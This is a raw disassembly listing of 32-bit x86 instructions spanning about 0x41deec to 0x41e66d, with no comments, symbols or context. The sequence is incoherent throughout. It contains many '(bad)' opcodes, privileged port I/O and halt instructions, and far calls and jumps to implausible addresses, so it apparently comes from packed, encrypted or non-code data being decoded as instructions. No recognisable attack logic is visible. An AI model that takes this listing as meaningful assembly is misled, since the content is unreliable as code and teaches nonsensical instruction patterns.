  41deec:	sub    eax,0x6c0fde3a
  41def1:	loop   0x41df6e
  41def3:	push   ecx
  41def4:	ins    BYTE PTR es:[edi],dx
  41def5:	mov    al,0xbe
  41def7:	int    0x1d
  41def9:	repz es es dec edx
  41defd:	dec    esp
  41defe:	gs dec ebx
  41df00:	mov    edi,DWORD PTR [ebp+0x50]
  41df03:	out    dx,al
  41df04:	mov    ebx,0xe9aa8cea
  41df09:	ins    DWORD PTR es:[edi],dx
  41df0a:	jmp    0x1af36c07
  41df0f:	rcr    DWORD PTR [ebp-0x798abd77],cl
  41df15:	fsubr  QWORD PTR [edi+ecx*4]
  41df18:	mov    ds,WORD PTR [eax+0x339085e4]
  41df1e:	mov    al,0x2e
  41df20:	dec    ebp
  41df21:	mov    ecx,0xb24ecf70
  41df26:	add    BYTE PTR [edi],0xbb
  41df29:	push   es
  41df2a:	mov    dl,0x84
  41df2c:	add    DWORD PTR [eax],edi
  41df2e:	sbb    al,0x8a
  41df30:	dec    ecx
  41df31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df32:	pop    esi
  41df33:	shr    BYTE PTR [edi-0x46afb69d],1
  41df39:	mov    ds:0x662d153a,eax
  41df3e:	ins    DWORD PTR es:[edi],dx
  41df3f:	scas   eax,DWORD PTR es:[edi]
  41df40:	loop   0x41dfb4
  41df42:	mov    dl,BYTE PTR [edi+0x623f7c4d]
  41df48:	(bad)  
  41df49:	and    al,0xf9
  41df4b:	sbb    edx,DWORD PTR [edx+0x48]
  41df4e:	ins    BYTE PTR es:[edi],dx
  41df4f:	push   esp
  41df50:	popa   
  41df51:	xchg   ecx,eax
  41df52:	push   esp
  41df53:	ret    0x86d6
  41df56:	sub    al,0x75
  41df58:	cwde   
  41df59:	pop    ecx
  41df5a:	pop    es
  41df5b:	mov    ch,0x9e
  41df5d:	cmp    al,0x34
  41df5f:	jnp    0x41df1f
  41df61:	gs xchg esp,eax
  41df63:	jge    0x41df2b
  41df65:	sub    al,0x89
  41df67:	push   DWORD PTR ss:[edi]
  41df6a:	ja     0x41df79
  41df6c:	sbb    DWORD PTR [eax],0x2df1d511
  41df72:	fidiv  WORD PTR [eax+edi*1-0x16d93d43]
  41df79:	(bad)  
  41df7a:	rcl    DWORD PTR [esi+0x2c],1
  41df7d:	(bad)  
  41df7e:	adc    al,0x2a
  41df80:	loop   0x41dfb0
  41df82:	cmp    eax,0xee641fb6
  41df87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df88:	pop    ds
  41df89:	jo     0x41df55
  41df8b:	sub    esi,DWORD PTR [ebx-0x46b7b630]
  41df91:	outs   dx,DWORD PTR ds:[esi]
  41df92:	fldcw  WORD PTR [esi-0x1b]
  41df95:	xchg   edi,eax
  41df96:	jg     0x41df8d
  41df98:	loopne 0x41dfbb
  41df9a:	push   cs
  41df9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df9c:	dec    esi
  41df9d:	sbb    dh,BYTE PTR [ebx+0x1a]
  41dfa0:	mov    ebp,0x51c6b0c8
  41dfa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfa6:	fistp  DWORD PTR fs:[ecx+edi*8-0x9]
  41dfab:	and    BYTE PTR [edx-0x64284f45],bl
  41dfb1:	shl    BYTE PTR [eax+0x29],0x43
  41dfb5:	or     al,0x27
  41dfb7:	ret    
  41dfb8:	add    eax,0x54f03ba2
  41dfbd:	mov    dh,0x51
  41dfbf:	(bad)  
  41dfc0:	sub    DWORD PTR cs:[esi],eax
  41dfc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfc4:	inc    edi
  41dfc5:	cmp    bl,BYTE PTR [edi+ecx*2-0x6c99f832]
  41dfcc:	adc    eax,0xb5036d7e
  41dfd1:	cmp    eax,0x64df8d24
  41dfd6:	mov    eax,0x55ba972e
  41dfdb:	push   cs
  41dfdc:	xchg   edx,eax
  41dfdd:	neg    DWORD PTR [esi]
  41dfdf:	xchg   edx,eax
  41dfe0:	and    ah,bl
  41dfe2:	out    dx,al
  41dfe3:	jmp    0x616d66c1
  41dfe8:	mov    edx,0x8c45d82e
  41dfed:	dec    ecx
  41dfee:	adc    BYTE PTR [ebp+0x23],ah
  41dff1:	jecxz  0x41dfe7
  41dff3:	gs ins BYTE PTR es:[edi],dx
  41dff5:	add    dl,ah
  41dff7:	inc    esi
  41dff8:	adc    al,0x63
  41dffa:	fdiv   QWORD PTR [eax+0x27]
  41dffd:	(bad)  
  41dfff:	sub    al,0x24
  41e001:	inc    ebx
  41e002:	cli    
  41e003:	imul   ebx,DWORD PTR [ebp+0x45cfe333],0x29af8f0c
  41e00d:	sub    eax,0xffffffcf
  41e010:	jp     0x41e02a
  41e012:	xor    DWORD PTR [esi+ecx*1-0x1f28696a],esp
  41e019:	(bad)  
  41e01a:	stos   DWORD PTR es:[edi],eax
  41e01b:	xor    eax,0x7df90f46
  41e020:	leave  
  41e021:	outs   dx,BYTE PTR ds:[esi]
  41e022:	pop    edi
  41e023:	dec    ebp
  41e024:	mov    esp,0xaf37050
  41e029:	jl     0x41e0a0
  41e02b:	mov    ah,0x2c
  41e02d:	hlt    
  41e02e:	aas    
  41e02f:	nop
  41e030:	dec    ebp
  41e031:	and    DWORD PTR [ebp-0x772b154c],edx
  41e037:	push   esi
  41e038:	mov    esi,0x18eb9fed
  41e03d:	call   FWORD PTR [edi]
  41e03f:	test   BYTE PTR [edi+eax*8+0x15],dh
  41e043:	mov    edx,0x533dfa45
  41e048:	jge    0x41e02a
  41e04a:	fimul  WORD PTR [edi+0x105fb4bb]
  41e050:	mov    eax,DWORD PTR [edi+0x384f8c01]
  41e056:	mov    ebx,fs
  41e058:	(bad)  
  41e059:	std    
  41e05a:	dec    ecx
  41e05b:	out    dx,eax
  41e05c:	shl    DWORD PTR [edx-0x4c],cl
  41e05f:	scas   al,BYTE PTR es:[edi]
  41e060:	adc    esp,0xffffffe5
  41e063:	jecxz  0x41e0de
  41e065:	loopne 0x41e076
  41e067:	jbe    0x41e0de
  41e069:	pop    ebp
  41e06a:	stc    
  41e06b:	xchg   ebp,eax
  41e06c:	add    dl,dl
  41e06e:	mov    cl,0x16
  41e070:	xchg   ebx,eax
  41e071:	mov    dl,0x34
  41e073:	pop    ecx
  41e074:	aaa    
  41e075:	xchg   ebp,eax
  41e076:	les    edi,FWORD PTR [ecx+0x1cf6c2ce]
  41e07c:	xchg   BYTE PTR [esi],dh
  41e07e:	mov    esp,0x27164c88
  41e083:	pop    es
  41e084:	push   0x6e
  41e086:	push   ss
  41e087:	inc    ebp
  41e088:	retf   
  41e089:	or     al,0xb4
  41e08b:	fyl2xp1 
  41e08d:	lock fild DWORD PTR [ecx+edx*8+0x4e]
  41e092:	outs   dx,DWORD PTR ds:[esi]
  41e093:	add    DWORD PTR [eax-0x53],0xfffffff9
  41e097:	ret    
  41e098:	inc    esp
  41e099:	push   edi
  41e09a:	add    al,0x38
  41e09c:	sub    ebx,ebx
  41e09e:	and    bh,BYTE PTR [ebp-0x1c9ed897]
  41e0a4:	out    0xac,al
  41e0a6:	retf   
  41e0a7:	mov    WORD PTR [ebx],gs
  41e0a9:	int3   
  41e0aa:	sbb    DWORD PTR [ebp+0x7f3aedc],edi
  41e0b0:	mov    eax,ds:0xb3f3bd42
  41e0b5:	push   cs
  41e0b6:	neg    DWORD PTR [ebx+0x2d7c9c11]
  41e0bc:	mov    al,0x91
  41e0be:	cmp    bh,BYTE PTR [edi-0x66]
  41e0c1:	cmp    BYTE PTR ss:[ebp-0x738508eb],ch
  41e0c8:	ss jb  0x41e05a
  41e0cb:	add    al,ah
  41e0cd:	or     dl,bh
  41e0cf:	mov    ds:0x2cb17a24,eax
  41e0d4:	add    BYTE PTR ds:0x9f7a801,bh
  41e0da:	das    
  41e0db:	les    edi,FWORD PTR [eax-0x5a]
  41e0de:	loope  0x41e0f5
  41e0e0:	(bad)  
  41e0e2:	mov    bh,BYTE PTR [esp+edx*8]
  41e0e5:	cwde   
  41e0e6:	push   cs
  41e0e7:	nop
  41e0e8:	push   ds
  41e0e9:	repnz mov esi,0x76b7f695
  41e0ef:	ds mov bl,0x8
  41e0f2:	bound  esi,QWORD PTR [edi+0x67685f45]
  41e0f8:	xor    DWORD PTR [ebx-0x64],eax
  41e0fb:	pop    eax
  41e0fc:	mov    ch,0xa0
  41e0fe:	dec    ebp
  41e0ff:	mov    ebp,0xb1100975
  41e104:	lods   al,BYTE PTR ds:[esi]
  41e105:	adc    eax,0x88282a70
  41e10a:	rcr    BYTE PTR [eax],1
  41e10c:	loope  0x41e101
  41e10e:	cwde   
  41e10f:	fwait
  41e110:	inc    esp
  41e111:	jge    0x41e0db
  41e113:	in     al,0x72
  41e115:	call   0x78ed:0x9769eb42
  41e11c:	mov    esp,0x91f9e8f2
  41e121:	sub    al,BYTE PTR [edx+0x1a7f17dc]
  41e127:	std    
  41e128:	and    al,BYTE PTR [edi]
  41e12a:	pop    es
  41e12b:	sub    eax,0xf9dd4064
  41e130:	mov    dl,0xbc
  41e132:	cmp    BYTE PTR [eax+0x5072539f],ch
  41e138:	icebp  
  41e139:	add    al,0xb9
  41e13b:	jbe    0x41e16d
  41e13d:	xor    BYTE PTR [esi-0x7],bh
  41e140:	mov    bl,0x22
  41e142:	in     al,dx
  41e143:	lea    ebx,[esi]
  41e145:	pop    ecx
  41e147:	out    dx,eax
  41e148:	test   bh,dh
  41e14a:	inc    esp
  41e14b:	pushf  
  41e14c:	retf   0xa13e
  41e14f:	data16 mov dl,0x88
  41e152:	inc    eax
  41e153:	inc    ebp
  41e154:	imul   edi,DWORD PTR [edx],0xda0c1664
  41e15a:	iret   
  41e15b:	cmp    dh,BYTE PTR [esi]
  41e15d:	mov    esi,DWORD PTR [ebx+0x18]
  41e160:	jle    0x41e0fe
  41e162:	daa    
  41e163:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e164:	mov    ds:0x6fd00438,eax
  41e169:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e16a:	int3   
  41e16b:	outs   dx,DWORD PTR ds:[esi]
  41e16c:	cdq    
  41e16d:	inc    esi
  41e16e:	sbb    edi,DWORD PTR [ebx-0x3aef6061]
  41e174:	mov    eax,0x6b4c241e
  41e179:	xchg   edx,eax
  41e17a:	dec    edx
  41e17b:	adc    al,0xe0
  41e17d:	xlat   BYTE PTR ds:[ebx]
  41e17e:	es mov ah,0xc4
  41e181:	push   ebp
  41e182:	int    0xd8
  41e184:	cmp    eax,0xc6aba880
  41e189:	pop    es
  41e18a:	inc    ebp
  41e18b:	jns    0x41e157
  41e18d:	test   al,0xb5
  41e18f:	and    al,0x71
  41e191:	mov    bh,BYTE PTR [eax+0x22]
  41e194:	pop    esp
  41e195:	sub    al,0xc
  41e197:	and    BYTE PTR [esi-0xd2601eb],bh
  41e19d:	pop    ss
  41e19e:	fwait
  41e19f:	mov    edi,0x6b8a8d9a
  41e1a4:	mov    bh,0xe4
  41e1a6:	loopne 0x41e1ac
  41e1a8:	sbb    edi,DWORD PTR [esi]
  41e1aa:	dec    esi
  41e1ab:	gs adc al,0x30
  41e1ae:	mov    WORD PTR [ebp+0x3ea09157],ss
  41e1b4:	in     eax,0x40
  41e1b6:	iret   
  41e1b7:	mov    ebx,0xaa3adf53
  41e1bc:	mov    bh,0x4c
  41e1be:	mov    ebx,DWORD PTR [ebp+0x62]
  41e1c1:	(bad)  
  41e1c2:	imul   edi,DWORD PTR [edi-0x41fe51ef],0x30bffb1
  41e1cc:	fcom   DWORD PTR [ecx+0x2ef9e7e6]
  41e1d2:	scas   eax,DWORD PTR es:[edi]
  41e1d3:	ret    0xa126
  41e1d6:	(bad)  
  41e1d7:	enter  0x6480,0xcd
  41e1db:	loopne 0x41e256
  41e1dd:	sub    eax,0xa532e8b0
  41e1e2:	mov    ah,0x3e
  41e1e4:	out    dx,eax
  41e1e5:	test   BYTE PTR [esi],dl
  41e1e7:	rcl    DWORD PTR [eax-0x2bc475d2],1
  41e1ed:	xor    ah,BYTE PTR [edx]
  41e1ef:	xchg   DWORD PTR [ebx+0xd],ebp
  41e1f2:	jae    0x41e25f
  41e1f4:	sub    BYTE PTR [eax+0x10],bl
  41e1f7:	out    dx,al
  41e1f8:	sbb    DWORD PTR [eax-0x2c76f855],0x65c47d78
  41e202:	into   
  41e203:	addr16 add eax,0xccc69f22
  41e209:	jmp    0x41e200
  41e20b:	retf   
  41e20c:	push   0xffffffad
  41e20e:	ss out dx,eax
  41e210:	dec    esi
  41e211:	(bad)  
  41e212:	mov    al,ds:0x75ea203b
  41e217:	adc    DWORD PTR [eax-0x1d],ebp
  41e21a:	jbe    0x41e263
  41e21c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e21d:	sbb    ebp,DWORD PTR [ebx]
  41e21f:	imul   ecx,DWORD PTR [esi],0x72371c9a
  41e225:	ficomp DWORD PTR ds:0xbb67ea69
  41e22b:	push   eax
  41e22c:	aad    0xf3
  41e22e:	je     0x41e26f
  41e230:	pop    esi
  41e231:	mov    al,ds:0xbae9265c
  41e236:	retf   0xd239
  41e239:	dec    esp
  41e23a:	sub    eax,0x26f6f934
  41e23f:	sar    al,1
  41e241:	adc    al,0xd2
  41e243:	xchg   edx,eax
  41e244:	loop   0x41e222
  41e246:	sbb    BYTE PTR [edx-0x3e],ch
  41e249:	cld    
  41e24a:	ret    0x3d42
  41e24d:	retf   0xe88e
  41e250:	jmp    0xc73941f5
  41e255:	not    BYTE PTR [esi]
  41e257:	jp     0x41e231
  41e259:	or     cl,ah
  41e25b:	pop    ds
  41e25c:	das    
  41e25d:	imul   eax,DWORD PTR [eax+0xd],0xffffffd8
  41e261:	sub    BYTE PTR [esi+0x3b],0x33
  41e265:	into   
  41e266:	rcl    DWORD PTR [ebx+0x3c3ad487],0xb
  41e26d:	(bad)  
  41e26e:	(bad)  [ecx-0x65811838]
  41e274:	(bad)  
  41e275:	aam    0x22
  41e277:	nop
  41e278:	mov    edx,0xb787ecf6
  41e27d:	mov    eax,0xcd02d35e
  41e282:	jno    0x41e26a
  41e284:	cli    
  41e285:	mov    ecx,0xfbe6739d
  41e28a:	pop    edi
  41e28b:	cli    
  41e28c:	pop    edx
  41e28d:	pop    edx
  41e28e:	jle    0x41e29a
  41e290:	fisttp WORD PTR [ebp+0x1b48bd7e]
  41e296:	inc    ecx
  41e297:	add    DWORD PTR [ebx+0x21],ebx
  41e29a:	arpl   WORD PTR [esp+edi*1],dx
  41e29d:	pop    es
  41e29e:	push   cs
  41e29f:	xor    dl,BYTE PTR [eax+eax*2]
  41e2a2:	sub    al,0x14
  41e2a4:	fadd   DWORD PTR [esi-0x33]
  41e2a7:	shr    BYTE PTR [ecx-0x64ccbc11],cl
  41e2ad:	cwde   
  41e2ae:	adc    eax,DWORD PTR [edx+0x1]
  41e2b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2b2:	retf   0x2780
  41e2b5:	lock mov ds:0x92a48ede,eax
  41e2bb:	xchg   ebx,eax
  41e2bc:	fdivr  QWORD PTR [ebp+0x59171408]
  41e2c2:	dec    edi
  41e2c3:	inc    ebp
  41e2c4:	in     eax,dx
  41e2c5:	sbb    BYTE PTR [eax-0x62],0x5e
  41e2c9:	cwde   
  41e2ca:	inc    edi
  41e2cb:	sbb    eax,0x993260f6
  41e2d0:	inc    ebp
  41e2d1:	sbb    edx,DWORD PTR [ebp+0x12f39e5c]
  41e2d7:	jnp    0x41e32b
  41e2d9:	fstp   TBYTE PTR [ebx-0x113c5d73]
  41e2df:	imul   esp,DWORD PTR ds:0xcbf098c0,0x7fdc7d9e
  41e2e9:	mov    dl,0x86
  41e2eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2ec:	shl    edx,1
  41e2ee:	aad    0x44
  41e2f0:	xchg   edx,eax
  41e2f1:	fnstsw WORD PTR [ecx-0x34060647]
  41e2f7:	pop    ss
  41e2f8:	inc    ebp
  41e2f9:	push   0xe
  41e2fb:	sbb    esp,DWORD PTR [edx-0x2f]
  41e2fe:	mov    ah,0x6b
  41e300:	idiv   dl
  41e302:	add    bl,BYTE PTR [ebp-0x27]
  41e305:	fwait
  41e306:	enter  0x6a8d,0xd9
  41e30a:	pop    eax
  41e30b:	dec    esi
  41e30c:	jmp    0x9f3:0x7cb951b2
  41e313:	ds iret 
  41e315:	mov    al,dh
  41e317:	pop    esp
  41e318:	not    BYTE PTR ds:0xd92fe41a
  41e31e:	lds    edi,FWORD PTR [edi+0x27]
  41e321:	fnsave [ebx]
  41e323:	xor    ebx,edx
  41e325:	inc    esp
  41e326:	dec    ebx
  41e327:	(bad)  
  41e328:	cmc    
  41e329:	adc    eax,0x4588b36
  41e32e:	jb     0x41e35d
  41e330:	dec    ebx
  41e331:	and    al,0xa6
  41e333:	mov    ds:0x810cf3d,al
  41e338:	jo     0x41e331
  41e33a:	aad    0xb6
  41e33c:	loopne 0x41e31c
  41e33e:	mov    ecx,0x63b67976
  41e343:	outs   dx,DWORD PTR ss:[esi]
  41e345:	repnz repz call 0x1d77:0x9fd24835
  41e34e:	(bad)  
  41e350:	and    BYTE PTR [ecx-0x52],bl
  41e353:	or     DWORD PTR [esi+0x76d26b95],ebp
  41e359:	push   eax
  41e35a:	cwde   
  41e35b:	js     0x41e3cf
  41e35d:	outs   dx,DWORD PTR ds:[esi]
  41e35e:	aaa    
  41e35f:	dec    esi
  41e360:	jns    0x41e307
  41e362:	les    ebp,FWORD PTR [edx-0x1dea1376]
  41e368:	xchg   esp,eax
  41e369:	lods   al,BYTE PTR ds:[esi]
  41e36a:	iret   
  41e36b:	in     al,0x40
  41e36d:	fwait
  41e36e:	pusha  
  41e36f:	cmp    DWORD PTR [ecx-0x23],esp
  41e372:	push   cs
  41e373:	sub    DWORD PTR [ebp-0x1017fc3d],0xfffffff2
  41e37a:	and    DWORD PTR [ecx-0x7e],ecx
  41e37d:	das    
  41e37e:	pop    esp
  41e37f:	mov    ebp,0xbfb0fc94
  41e384:	mov    bh,0xde
  41e386:	inc    ebp
  41e387:	cmp    edx,ebx
  41e389:	xchg   edi,eax
  41e38a:	out    dx,eax
  41e38b:	pop    eax
  41e38c:	sti    
  41e38d:	add    al,BYTE PTR [edi+0x76cc44b9]
  41e393:	push   0xf3e05528
  41e398:	mov    eax,0xf39f8d91
  41e39d:	cdq    
  41e39e:	(bad)  
  41e39f:	in     al,0xc4
  41e3a1:	outs   dx,BYTE PTR ds:[esi]
  41e3a2:	or     dh,BYTE PTR [esi+edi*8]
  41e3a5:	fldenv ds:0x5a23b1a6
  41e3ab:	inc    ebp
  41e3ac:	mov    ds,WORD PTR [edx]
  41e3ae:	in     eax,0x68
  41e3b0:	or     BYTE PTR [eax+edi*8-0x3d1ec443],ah
  41e3b7:	and    ebp,DWORD PTR [ecx+0x77b9a70a]
  41e3bd:	ret    
  41e3be:	mov    cl,0x2f
  41e3c0:	pop    ss
  41e3c1:	fwait
  41e3c2:	popf   
  41e3c3:	and    eax,0xe4a4923f
  41e3c8:	fisttp WORD PTR [ecx+0x74794066]
  41e3ce:	sbb    DWORD PTR [edi],eax
  41e3d0:	sbb    bh,BYTE PTR [ebp-0x50]
  41e3d3:	xchg   edi,eax
  41e3d4:	int3   
  41e3d5:	jl     0x41e453
  41e3d7:	xchg   DWORD PTR [edx-0x6f],edx
  41e3da:	fwait
  41e3db:	inc    edx
  41e3dc:	adc    al,0xba
  41e3df:	mov    ecx,DWORD PTR [edi+0x5f]
  41e3e2:	jecxz  0x41e383
  41e3e4:	or     edi,esi
  41e3e6:	sbb    DWORD PTR [edx+0x6dfb35d5],ebx
  41e3ec:	cmp    BYTE PTR [ebx-0x5c271bfa],0xaf
  41e3f3:	dec    esp
  41e3f4:	jg     0x41e401
  41e3f6:	nop
  41e3f7:	or     al,0x9
  41e3f9:	add    dh,BYTE PTR [edx]
  41e3fb:	jo     0x41e44a
  41e3fd:	sbb    al,0x70
  41e3ff:	mov    ebp,0x825672bd
  41e404:	hlt    
  41e405:	pop    ds
  41e406:	xchg   DWORD PTR [ebx-0x4e],edx
  41e409:	add    BYTE PTR [eax+eax*4+0x30],ch
  41e40d:	mov    cl,0x97
  41e40f:	fimul  WORD PTR [ebp+0x24]
  41e412:	ins    DWORD PTR es:[edi],dx
  41e413:	ret    
  41e414:	iret   
  41e415:	inc    ebx
  41e416:	outs   dx,DWORD PTR ds:[esi]
  41e417:	and    al,0x60
  41e419:	adc    esi,DWORD PTR [esi+0x3a5b384d]
  41e41f:	sahf   
  41e420:	and    DWORD PTR [ebx+0xa1bbb02],ecx
  41e426:	shr    BYTE PTR [eax-0x68],1
  41e429:	inc    ebp
  41e42a:	mov    ds:0x3232feb5,al
  41e42f:	cwde   
  41e430:	shl    DWORD PTR [eax],1
  41e432:	or     DWORD PTR [ecx+0x532e464e],0x6e
  41e439:	push   edi
  41e43a:	out    dx,eax
  41e43b:	stc    
  41e43c:	sbb    esp,esi
  41e43e:	xor    eax,0x5cf1aa
  41e443:	fs push edi
  41e445:	xor    eax,0x8ce7a3cf
  41e44a:	cdq    
  41e44b:	cwde   
  41e44c:	outs   dx,DWORD PTR ds:[esi]
  41e44d:	out    dx,al
  41e44e:	nop
  41e44f:	out    dx,eax
  41e450:	dec    eax
  41e451:	cmp    edi,ebp
  41e453:	xor    BYTE PTR [ebx],ch
  41e455:	mov    ds:0x425fd4fd,al
  41e45a:	jae    0x41e493
  41e45c:	fsubr  QWORD PTR [edx]
  41e45e:	mov    ebx,0xa247ae76
  41e463:	pop    es
  41e464:	dec    edx
  41e465:	call   0x124603e7
  41e46a:	data16 loop 0x41e43b
  41e46d:	and    al,0x2c
  41e46f:	xor    esi,esp
  41e471:	xchg   edi,eax
  41e472:	jno    0x41e498
  41e474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e475:	mov    edi,0x548bf82d
  41e47a:	dec    ebx
  41e47b:	in     al,0xfd
  41e47d:	adc    al,0x48
  41e47f:	push   ds
  41e480:	and    eax,0xae929991
  41e485:	pop    esp
  41e486:	jmp    0x41e4c8
  41e488:	fwait
  41e489:	push   eax
  41e48a:	pandn  mm5,QWORD PTR [eax]
  41e48d:	and    ecx,DWORD PTR [edi]
  41e48f:	stos   BYTE PTR es:[edi],al
  41e490:	pop    es
  41e491:	sar    BYTE PTR [eax-0x7],0xe7
  41e495:	aam    0x5
  41e497:	mov    esp,0xc631f337
  41e49c:	push   es
  41e49d:	xor    eax,0xbfe13e88
  41e4a2:	imul   ecx,esp,0x7d7dfb12
  41e4a8:	mov    ch,0xe0
  41e4aa:	xchg   ebp,eax
  41e4ab:	jg     0x41e48d
  41e4ad:	pop    esp
  41e4ae:	xor    al,bh
  41e4b0:	call   0x61e61
  41e4b5:	pop    esi
  41e4b6:	aaa    
  41e4b7:	ins    DWORD PTR es:[edi],dx
  41e4b8:	sub    ecx,DWORD PTR [ebx+0x69cfe3f5]
  41e4be:	(bad)
  41e4c1:	out    0xae,al
  41e4c3:	int    0xf2
  41e4c5:	and    al,0x1a
  41e4c7:	fs js  0x41e535
  41e4ca:	in     eax,dx
  41e4cb:	fwait
  41e4cc:	mov    ah,0x8c
  41e4ce:	xor    dl,BYTE PTR [edi]
  41e4d0:	(bad)  
  41e4d1:	loopne 0x41e469
  41e4d3:	test   al,0x2b
  41e4d5:	call   0x8c340fc1
  41e4da:	mov    ds:0xc51fecd3,eax
  41e4df:	mov    ecx,0xc73a225e
  41e4e4:	lods   eax,DWORD PTR ds:[esi]
  41e4e5:	lahf   
  41e4e6:	daa    
  41e4e7:	test   BYTE PTR [esp+eax*2-0x6e1a3d8f],0x4c
  41e4ef:	push   ebp
  41e4f0:	(bad)  
  41e4f1:	dec    ebp
  41e4f2:	lods   al,BYTE PTR ds:[esi]
  41e4f3:	xchg   DWORD PTR [ebp+ebp*4+0x773baa43],edi
  41e4fa:	inc    eax
  41e4fb:	into   
  41e4fc:	(bad)  
  41e4fd:	cmp    eax,0x212ed33e
  41e502:	addr16 dec ebx
  41e504:	adc    DWORD PTR [ebp+eiz*2-0x45],edx
  41e508:	jo     0x41e497
  41e50a:	dec    ebp
  41e50b:	stos   BYTE PTR es:[edi],al
  41e50c:	push   edi
  41e50d:	call   0xcf58:0x524d160c
  41e514:	aaa    
  41e515:	push   ds
  41e516:	adc    eax,0x493bfcc6
  41e51b:	sti    
  41e51c:	test   edi,ecx
  41e51e:	clc    
  41e51f:	(bad)  
  41e520:	jle    0x41e57e
  41e522:	scas   eax,DWORD PTR es:[edi]
  41e523:	int    0x87
  41e525:	cld    
  41e526:	mov    DWORD PTR [edx+0x5dc995b8],eax
  41e52c:	mov    DWORD PTR [esi],esi
  41e52e:	jae    0x41e5a7
  41e530:	jl     0x41e54e
  41e532:	pop    ebx
  41e533:	mov    cs,WORD PTR [ebx+0x40]
  41e536:	cld    
  41e537:	inc    esi
  41e538:	(bad)  
  41e53a:	cld    
  41e53b:	fadd   st(5),st
  41e53d:	scas   al,BYTE PTR es:[edi]
  41e53e:	sbb    eax,0xc0746b1a
  41e543:	sub    eax,0x9dd1c31e
  41e548:	pop    esp
  41e549:	mov    WORD PTR [ecx+edi*1],es
  41e54c:	mov    edx,0xb7126941
  41e551:	pop    es
  41e552:	seta   BYTE PTR [ecx+0x4d59d91e]
  41e559:	(bad)  
  41e55a:	ss (bad) 
  41e55d:	push   es
  41e55e:	inc    edi
  41e55f:	clc    
  41e560:	add    eax,0xbee16b50
  41e565:	pop    ebx
  41e566:	jne    0x41e56a
  41e568:	call   FWORD PTR [eax-0x4b832568]
  41e56e:	cmp    esp,ecx
  41e570:	cdq    
  41e571:	push   es
  41e572:	fdivr  QWORD PTR [edi-0x7d3bb415]
  41e578:	jecxz  0x41e511
  41e57a:	adc    ebx,DWORD PTR [eax+esi*2+0x56b2996d]
  41e581:	ds lock gs dec edi
  41e585:	repz inc esi
  41e587:	lods   eax,DWORD PTR ds:[esi]
  41e588:	and    ah,BYTE PTR [edi+esi*1]
  41e58b:	aad    0xaa
  41e58d:	call   0xf1fbbe86
  41e592:	stos   BYTE PTR es:[edi],al
  41e593:	scas   eax,DWORD PTR es:[edi]
  41e594:	add    BYTE PTR [esi-0x4ef5e59a],dl
  41e59a:	jae    0x41e5ec
  41e59c:	mov    bh,0x35
  41e59e:	fistp  DWORD PTR [edi-0x14]
  41e5a1:	jp     0x41e56f
  41e5a3:	(bad)  
  41e5a4:	js     0x41e5a9
  41e5a6:	jnp    0x41e60e
  41e5a8:	clc    
  41e5a9:	neg    DWORD PTR [eax-0x4c]
  41e5ac:	inc    esi
  41e5ad:	int3   
  41e5ae:	in     eax,dx
  41e5af:	xchg   edi,eax
  41e5b0:	clc    
  41e5b1:	scas   al,BYTE PTR es:[edi]
  41e5b2:	leave  
  41e5b3:	push   edi
  41e5b4:	in     eax,0xc
  41e5b6:	es sbb eax,0x3e049a5
  41e5bc:	gs pop esi
  41e5be:	dec    eax
  41e5bf:	popf   
  41e5c0:	pop    es
  41e5c1:	add    DWORD PTR [esi+0x62],edi
  41e5c4:	xor    BYTE PTR [ebp-0x75d0c83f],al
  41e5ca:	rcr    BYTE PTR cs:[ecx+esi*4],1
  41e5ce:	add    ebp,DWORD PTR [ecx]
  41e5d0:	push   eax
  41e5d1:	cmp    DWORD PTR [edx],esi
  41e5d3:	(bad)  
  41e5d4:	loope  0x41e60d
  41e5d6:	lock or al,0xcd
  41e5d9:	call   DWORD PTR [ecx-0x6c]
  41e5dc:	sub    DWORD PTR [esi+edi*8],eax
  41e5df:	mov    ch,0xff
  41e5e1:	dec    ecx
  41e5e2:	mov    edx,DWORD PTR [esp+0x7b]
  41e5e6:	pushf  
  41e5e7:	retf   
  41e5e8:	pop    ebx
  41e5e9:	sbb    eax,0x9f98daa6
  41e5ee:	mov    al,BYTE PTR [eax]
  41e5f0:	add    DWORD PTR [eax],0xfffffffe
  41e5f3:	rcr    BYTE PTR [ecx-0x1da493e4],0x2d
  41e5fa:	lahf   
  41e5fb:	fbld   TBYTE PTR [edi-0x73]
  41e5fe:	cs xchg ecx,eax
  41e600:	mov    esi,0xa6057da7
  41e605:	enter  0xe6ce,0x4
  41e609:	sti    
  41e60a:	dec    ebx
  41e60b:	push   edi
  41e60c:	shl    dl,cl
  41e60e:	ret    0xafc0
  41e611:	leave  
  41e612:	xchg   DWORD PTR [ecx+0x3154bacd],ebp
  41e618:	mov    edx,0x154493ef
  41e61d:	(bad)  
  41e61e:	loope  0x41e67a
  41e620:	cwde   
  41e621:	pop    ebp
  41e622:	sahf   
  41e623:	or     BYTE PTR [ebx+0x56c5d70b],bh
  41e629:	test   esp,ebx
  41e62b:	sub    al,0xc4
  41e62d:	dec    esp
  41e62e:	sbb    eax,0xc39fe10
  41e633:	scas   al,BYTE PTR es:[edi]
  41e634:	xor    eax,0x562e2173
  41e639:	stos   BYTE PTR es:[edi],al
  41e63a:	test   eax,0x1f41b458
  41e63f:	call   0x65ffbc70
  41e644:	out    dx,al
  41e645:	fdivr  DWORD PTR [ebp+0x127a6a0c]
  41e64b:	pop    ebp
  41e64c:	inc    ecx
  41e64d:	icebp  
  41e64e:	cmp    ecx,DWORD PTR [ebx+ebp*2-0x7c0c5d23]
  41e655:	icebp  
  41e656:	push   esi
  41e657:	and    DWORD PTR [esi+0x1b807f12],edi
  41e65d:	jmp    esp
  41e65f:	aam    0x11
  41e661:	leave  
  41e662:	xchg   edi,eax
  41e663:	xchg   edx,eax
  41e664:	fidivr WORD PTR [ecx-0x7a]
  41e668:	test   DWORD PTR [esi],edx
  41e66a:	mov    esi,DWORD PTR [eax-0x2f]
  41e66d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
